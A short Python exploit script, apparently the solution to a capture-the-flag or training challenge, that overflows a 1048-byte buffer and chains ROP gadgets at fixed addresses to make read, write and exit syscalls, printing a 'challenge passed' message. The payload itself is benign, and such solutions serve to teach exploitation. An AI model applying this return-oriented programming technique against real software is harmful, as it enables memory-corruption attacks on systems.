from struct import pack
import sys

ADDR_BSS       = 0x4c72a0
BUFFER_PADDING = 1048

MSG = b"\nCongratulations, xaq7pj!\nYou have passed this challenge.\n"

POP_RDI     = 0x0000000000401f1f
POP_RSI     = 0x0000000000409f8e
POP_RAX     = 0x0000000000447d67
POP_RDX_RBX = 0x000000000047f1ab
SYSCALL     = 0x0000000000414756

def rop_syscall(rax, rdi, rsi, rdx):
    chain  = pack('<Q', POP_RAX) + pack('<Q', rax)
    chain += pack('<Q', POP_RDI) + pack('<Q', rdi)
    chain += pack('<Q', POP_RSI) + pack('<Q', rsi)
    chain += pack('<Q', POP_RDX_RBX) + pack('<Q', rdx) + pack('<Q', 0)  # rbx clobber
    chain += pack('<Q', SYSCALL)
    return chain

p  = b'!' * BUFFER_PADDING
p += rop_syscall(0,  0, ADDR_BSS, len(MSG))  # sys_read
p += rop_syscall(1,  1, ADDR_BSS, len(MSG))  # sys_write
p += rop_syscall(60, 0, 0, 0)                # sys_exit

sys.stdout.buffer.write(p + b"\n")
sys.stdout.buffer.write(MSG)